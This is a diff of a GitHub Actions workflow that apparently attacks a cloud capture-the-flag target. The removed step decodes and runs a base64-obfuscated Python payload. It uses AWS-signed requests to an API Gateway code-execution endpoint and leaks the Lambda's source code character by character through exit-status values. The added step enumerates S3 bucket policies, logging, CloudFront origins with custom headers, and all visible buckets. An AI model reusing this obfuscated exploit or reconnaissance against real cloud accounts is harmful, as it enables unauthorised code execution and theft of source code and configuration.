@@ -20,9 +20,19 @@ jobs:
 
       - name: Fetch docs.html
         run: curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html
-
-      - name: Read Lambda source via inspect
+        
+      - name: Enumerate with ctf_participant_role
         run: |
-          pip install requests requests-aws4auth --quiet
-          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzLCByZSwgdGltZQpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aAoKQVBJID0gJ2h0dHBzOi8vbDhzc3lhejY5Zi5leGVjdXRlLWFwaS51cy1lYXN0LTEuYW1hem9uYXdzLmNvbS9kZXYvY29kZV9leGVjJwpjcmVkcyA9IGJvdG8zLlNlc3Npb24oKS5nZXRfY3JlZGVudGlhbHMoKS5nZXRfZnJvemVuX2NyZWRlbnRpYWxzKCkKYXV0aCA9IEFXUzRBdXRoKGNyZWRzLmFjY2Vzc19rZXksIGNyZWRzLnNlY3JldF9rZXksICd1cy1lYXN0LTEnLCAnZXhlY3V0ZS1hcGknLCBzZXNzaW9uX3Rva2VuPWNyZWRzLnRva2VuKQoKZGVmIHJ1bihjb2RlKToKICAgIHIgPSByZXF1ZXN0cy5wb3N0KEFQSSwganNvbj17J2NvZGUnOiBiYXNlNjQuYjY0ZW5jb2RlKGNvZGUuZW5jb2RlKCkpLmRlY29kZSgpfSwgYXV0aD1hdXRoKQogICAgcmV0dXJuIHIuanNvbigpCgpkZWYgZWMocmVzcCk6CiAgICBtc2cgPSByZXNwLmdldCgnZXJyb3JNZXNzYWdlJywgJycpCiAgICBpbXBvcnQgcmUgYXMgcmUyCiAgICBtID0gcmUyLnNlYXJjaChyJ2V4aXQgc3RhdHVzIChcZCspJywgbXNnKQogICAgcmV0dXJuIGludChtLmdyb3VwKDEpKSBpZiBtIGVsc2UgTm9uZQoKciA9IHJ1bigiaW1wb3J0IGxhbWJkYV9mdW5jdGlvbiwgaW5zcGVjdDsgc3JjPWluc3BlY3QuZ2V0c291cmNlKGxhbWJkYV9mdW5jdGlvbik7IHJhaXNlIFN5c3RlbUV4aXQobGVuKHNyYykpIikKc3JjX2xlbiA9IGVjKHIpCnByaW50KGYic291cmNlIGxlbmd0aDoge3NyY19sZW59IHJhdzoge3J9IikKcjIgPSBydW4oImltcG9ydCBsYW1iZGFfZnVuY3Rpb24sIGluc3BlY3Q7IHNyYz1pbnNwZWN0LmdldHNvdXJjZShsYW1iZGFfZnVuY3Rpb24pOyByYWlzZSBTeXN0ZW1FeGl0KGxlbihzcmMpLy8yNTYpIikKaGlnaCA9IGVjKHIyKQpyZWFsX3NyY19sZW4gPSAoaGlnaCBvciAwKSoyNTYgKyAoc3JjX2xlbiBvciAwKQpwcmludChmInJlYWwgc291cmNlIGxlbmd0aDoge3JlYWxfc3JjX2xlbn0iKQpzcmMgPSBbXQpmb3IgaSBpbiByYW5nZShtaW4ocmVhbF9zcmNfbGVuIG9yIDAsIDUwMCkpOgogICAgY29kZSA9IGYiaW1wb3J0IGxhbWJkYV9mdW5jdGlvbiwgaW5zcGVjdDsgc3JjPWluc3BlY3QuZ2V0c291cmNlKGxhbWJkYV9mdW5jdGlvbik7IHJhaXNlIFN5c3RlbUV4aXQob3JkKHNyY1t7aX1dKSkiCiAgICByID0gcnVuKGNvZGUpCiAgICBjID0gZWMocikKICAgIHNyYy5hcHBlbmQoY2hyKGMpIGlmIGMgZWxzZSAnPycpCiAgICB0aW1lLnNsZWVwKDAuMTIpCnByaW50KCk7IHByaW50KCI9PT0gTEFNQkRBIFNPVVJDRSA9PT0iKTsgcHJpbnQoIiIuam9pbihzcmMpKQo='
-          printf '%s' "$B64" | base64 -d > /tmp/src3.py && python3 /tmp/src3.py
+          echo "=== bucket policy (real values) ==="
+          aws s3api get-bucket-policy --bucket userad88e2b168aa387e 2>&1
+
+          echo "=== bucket logging (where logs go) ==="
+          aws s3api get-bucket-logging --bucket userad88e2b168aa387e 2>&1
+
+          echo "=== cloudfront distributions ==="
+          aws cloudfront list-distributions \
+            --query 'DistributionList.Items[].{Domain:DomainName,Origins:Origins.Items[].{Domain:DomainName,Headers:CustomHeaders.Items}}' \
+            --output json 2>&1
+
+          echo "=== all buckets visible ==="
+          aws s3api list-buckets 2>&1
